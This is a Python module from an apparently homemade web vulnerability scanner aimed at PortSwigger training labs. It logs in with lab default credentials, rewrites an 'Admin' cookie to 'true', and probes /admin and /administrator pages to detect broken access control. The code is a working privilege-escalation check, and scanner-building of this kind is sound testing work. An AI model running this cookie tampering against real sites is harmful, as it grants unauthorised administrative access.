# import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint
import handle_form
import config
import result

def checkCookie(url, username, password):
    # print(username, password)
    # print(url)
    # test on HTML forms
    forms = handle_form.get_all_forms(url)
    # print(forms)
    # print(get_form_details(forms[0]))
    for form in forms:
        form_details = handle_form.get_form_details(form)
        # the data body we want to submit
        data = {}
        for input_tag in form_details["inputs"]:
            if input_tag["value"] or input_tag["type"] == "hidden":
                # any input form that has some value or hidden,
                # just use it in the form body
                try:
                    # data[input_tag["name"]] = input_tag["value"] + c
                    data[input_tag["name"]] = input_tag["value"]
                except:
                    pass
            elif input_tag["type"] != "submit":
                # all others except submit, use some junk data with special character
                # print(username, len(username))
                if input_tag["name"] == "username":
                    if len(username) != 0:
                        data[input_tag["name"]] = username
                        # print(username)
                    else:
                        data[input_tag["name"]] = f"wiener"
                    # print("1:", input_tag["name"])
                else:
                    if len(password) != 0:
                        data[input_tag["name"]] = password
                    else:
                        data[input_tag["name"]] = f"peter"
                    # print(input_tag["name"])
                # form_details[input_tag["name"]] = f"peter"
        # join the url with the action (form request URL)
        #for my labs access control
        mainurl = url
        # config.r.get(url.replace("/login/","")+"/logout")
        url = urljoin(url, form_details["action"])
        # check session before request
        if form_details["method"] == "post":
            # print('method: POST')
            res = config.s.post(url, data=data)
            # print(url, data)
            cookies = config.s.cookies
            # print("Cookies:")
            for cookie_name, cookie_data in cookies.items():
                # print(cookie_name, cookie_data)
                if cookie_name == "Admin" or cookie_name == "admin":
                    del config.s.cookies[cookie_name]
                    config.s.cookies[cookie_name] = "true"
                    # print(f'{cookie_name} : {cookie_data}')
                # print(f"{cookie_name}: {cookie_data}")
            # print(data)

                
    
            respone = config.s.get(url.replace("/login","")+"/admin")
            # print(url.replace("/login","")+"/admin")
            if respone.status_code == 200:
                result.result["vul"] = True
                result.result["link"] = url.replace("/login","")+"/admin"
                result.result["countPayload"] = 0
                result.result["payload"] = "None"
                result.showResult(result.result)
                #for my labs access control
                config.r.get(mainurl.replace("/login/","")+"/logout")
                return True
            else:    
                respone = config.s.get(url.replace("/login","")+"/administrator")
                # print(url.replace("/login","")+"/administrator")
                if respone.status_code == 200:
                    result.result["vul"] = True
                    result.result["link"] = url.replace("/login","")+"/administrator"
                    result.result["countPayload"] = 0
                    result.result["payload"] = "None"
                    result.showResult(result.result)
                    #for my labs access control
                    config.r.get(mainurl.replace("/login/","")+"/logout")
                    return True
            #     print("[+] Detected cookie save status Admin")
            # print(respone.status_code)
        elif form_details["method"] == "get":
            res = config.s.get(url, params=data)
    return False

# checkCookie("https://0a61005303a01e6f84f6b530002f006d.web-security-academy.net/login")